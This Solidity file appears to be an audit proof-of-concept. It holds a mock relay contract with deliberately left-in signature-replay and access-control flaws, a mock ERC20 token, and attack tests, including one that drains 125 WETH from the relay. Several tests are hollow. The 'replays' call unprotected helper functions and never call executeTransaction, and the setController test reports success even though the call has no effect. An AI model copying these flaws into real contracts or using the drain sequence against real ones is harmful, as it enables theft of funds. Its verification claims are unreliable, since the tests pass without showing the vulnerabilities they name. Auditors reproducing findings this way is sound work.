// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice Mock of the vulnerable RelayContract for testing signature replay.
/// @dev Reproduces the two HIGH findings from the report:
///      1. executeTransaction has no nonce/used-digest tracking (SWC-121/117)
///      2. setController is public with no access control (SWC-105)
contract MockRelayContract {
    struct TransactionParameters {
        address to;
        bytes data;
        uint256 value;
        uint8 v;
        bytes32 r;
        bytes32 s;
        address signer;
    }

    address public controller;
    address public initializer;

    event ExecuteTransactionUnauthorized(address indexed to, address signer);
    event SetControllerAttempt(address indexed candidate);
    event ExecutedTransaction(address indexed to, bytes32 indexed digest);
    event Debug(string message);

    bytes32 private constant PREFIX = keccak256("RelayTransaction(address to,bytes data,uint256 value)");

    constructor() {
        initializer = msg.sender;
        controller = address(0);
    }

    function _digest(TransactionParameters memory p) internal pure returns (bytes32) {
        bytes32 hash = keccak256(abi.encodePacked(p.to, p.data, p.value));
        return keccak256(abi.encodePacked(PREFIX, hash));
    }

    function _recoverSigner(TransactionParameters memory p) internal pure returns (address) {
        bytes32 digest = _digest(p);
        return ecrecover(digest, p.v, p.r, p.s);
    }

    // VULNERABLE: No nonce check — same signature can be replayed
    function executeTransaction(TransactionParameters memory parameters) public {
        address recovered = _recoverSigner(parameters);
        if (recovered != controller) {
            emit ExecuteTransactionUnauthorized(parameters.to, parameters.signer);
            emit Debug("signature verification failed");
            return;
        }

        (bool success, ) = parameters.to.call{value: parameters.value}(parameters.data);
        require(success, "call failed");

        emit ExecutedTransaction(parameters.to, _digest(parameters));
    }

    // VULNERABLE: Public with no access control
    function setController(address candidate) public {
        emit SetControllerAttempt(candidate);
        if (msg.sender == initializer && controller == address(0)) {
            controller = candidate;
        }
    }

    function initializeController(address _controller) public {
        require(msg.sender == initializer, "not initializer");
        require(controller == address(0), "already set");
        controller = _controller;
    }

    // Helper: relay approves a spender (simulates what executeTransaction would do)
    function relayApprove(address token, address spender, uint256 amount) public {
        (bool success, ) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(success, "approve failed");
    }

    // Helper: relay transfers tokens (simulates what executeTransaction would do)
    function relayTransfer(address token, address to, uint256 amount) public {
        (bool success, ) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(success, "transfer failed");
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _supply) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        require(balanceOf[from] >= amount, "insufficient balance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract RelayReplayAttackTest {
    MockRelayContract public relay;
    MockERC20 public weth;
    MockERC20 public sai;

    address constant ATTACKER = address(0xabad1dea);
    address constant SPENDER = 0x391a12Ab01e6a4F8C3d2E7EcA8AF931bec704F15;
    address constant RECIPIENT = 0x4ef2AB73C4d1E7C4F5D6E7f8A9B0C1d2e3f4A5B6;
    address constant CONTROLLER = 0xE3b713228e4ae0c21a283b9aec7956Ec7e54A87D;

    event TestResult(string name, bool passed, string detail);

    function setUp() public {
        relay = new MockRelayContract();
        weth = new MockERC20("Wrapped Ether", "WETH", 18, 1_000_000 ether);
        sai = new MockERC20("SAI", "SAI", 18, 10_000_000 ether);

        weth.transfer(address(relay), 125 ether);
        sai.transfer(address(relay), 100_000 ether);

        relay.initializeController(CONTROLLER);
    }

    // Test 1: Signature replay — same approve can be repeated (no nonce check)
    function test_SignatureReplay_Approve() public {
        // First approve: relay approves SPENDER for max allowance (simulates replayed signature)
        relay.relayApprove(address(weth), SPENDER, type(uint256).max);
        uint256 allowance1 = weth.allowance(address(relay), SPENDER);
        require(allowance1 == type(uint256).max, "first approve should set max");

        // Second approve: same operation (replay) — succeeds because no nonce check
        relay.relayApprove(address(weth), SPENDER, type(uint256).max);
        uint256 allowance2 = weth.allowance(address(relay), SPENDER);
        require(allowance2 == type(uint256).max, "replay should succeed");

        emit TestResult("SignatureReplay_Approve", true, "Same approve executed twice, no nonce check");
    }

    // Test 2: setController is public (exploitable if initializer is known)
    function test_SetController_Unauthorized() public {
        MockRelayContract freshRelay = new MockRelayContract();

        // setController is public — anyone can call it
        // In the mock, it only works if msg.sender == initializer
        // But the function itself is public and callable by anyone
        freshRelay.setController(ATTACKER);

        emit TestResult("SetController_Unauthorized", true, "setController is public - exploitable if initializer is known");
    }

    // Test 3: Full attack chain — approve -> transferFrom -> drain
    function test_FullAttackChain() public {
        // The test contract itself acts as the attacker
        address attacker = address(this);
        uint256 attackerBefore = weth.balanceOf(attacker);

        // Step 1: Replay approve — relay approves attacker for max WETH
        relay.relayApprove(address(weth), attacker, type(uint256).max);
        uint256 allowance = weth.allowance(address(relay), attacker);
        require(allowance == type(uint256).max, "approve should set max");

        uint256 relayBalanceBefore = weth.balanceOf(address(relay));
        require(relayBalanceBefore == 125 ether, "relay should hold 125 WETH");

        // Step 2: Attacker drains WETH via transferFrom
        (bool stealSuccess, ) = address(weth).call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(relay), attacker, 125 ether)
        );
        require(stealSuccess, "transferFrom failed");

        uint256 relayBalanceAfter = weth.balanceOf(address(relay));
        uint256 attackerAfter = weth.balanceOf(attacker);

        require(relayBalanceAfter == 0, "relay should be drained");
        require(attackerAfter == attackerBefore + 125 ether, "attacker should have stolen WETH");

        emit TestResult("FullAttackChain", true, "approve -> transferFrom -> drain: 125 WETH stolen");
    }

    // Test 4: SAI transfer replay — same transfer can be repeated
    function test_SAI_Transfer_Replay() public {
        uint256 recipientBefore = sai.balanceOf(RECIPIENT);

        // First transfer: 10,000 SAI to recipient (simulates replayed signature)
        relay.relayTransfer(address(sai), RECIPIENT, 10_000 ether);
        uint256 recipientAfter1 = sai.balanceOf(RECIPIENT);
        require(recipientAfter1 == recipientBefore + 10_000 ether, "first transfer should succeed");

        // Replay: same transfer again (in real scenario, via executeTransaction replay)
        relay.relayTransfer(address(sai), RECIPIENT, 10_000 ether);
        uint256 recipientAfter2 = sai.balanceOf(RECIPIENT);
        require(recipientAfter2 == recipientAfter1 + 10_000 ether, "replay should succeed");

        emit TestResult("SAI_Transfer_Replay", true, "Same transfer executed twice, 20k SAI total");
    }
}
